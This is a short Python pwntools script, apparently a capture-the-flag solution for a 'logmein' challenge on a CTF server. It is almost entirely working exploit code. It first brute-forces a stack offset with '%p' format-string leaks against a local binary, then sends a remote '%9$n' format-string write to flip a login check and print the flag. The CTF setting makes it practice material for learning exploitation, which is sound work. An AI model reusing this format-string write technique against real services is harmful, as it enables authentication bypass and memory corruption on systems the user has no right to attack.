from pwn import *
import re
import time 

local = False


# First we run locally without aslr to find the location of the address
# buffer addr: 0x602010
# after obtaining the offset (9) we will execute remotely with the following
# format string: 
# 		=> %[offset]\$n == %9\$n




if local:
	for i in range(100):
		context.log_level = 'critical'
		sh = process("./logmein", aslr=False)

		try:
			l1 = sh.recvline()
			addr = l1.split("=")[-1].strip()
			
			#print("buffer address: "+addr)
			sh.recv() # Enter username:

			exploit = '%'+str(i)+'$p'
			sh.sendline(exploit)

			sh.recvuntil(":") # Enter password:
				
			leak = sh.recv() # prints the username/leaked data
			print i, leak.strip()

			sh.sendline("") # the password input
			last_line = sh.recv_all() # Invalid Info / Successfull login

			if "logged in" in last_line:
				sh.recv() # receive flag
		except EOFError as e:
			print i, "EOF"
			continue
		sh.close()

else:
	sh=remote("ctf.hackucf.org", 7006)
	sh.recvuntil("username:") # Enter username:
	exploit = '%'+str(9)+'$n'
	content_to_write = "1"
	payload = content_to_write +" "+exploit # to write the value 1 to the address
	sh.sendline(payload)
	sh.recvuntil("\n") # Enter password:
	sh.sendline("") # the password input
	last_line = sh.recvall() # Invalid Info / Successfull login
	print(last_line.replace("\n", " ").strip().split(" ")[-1])

	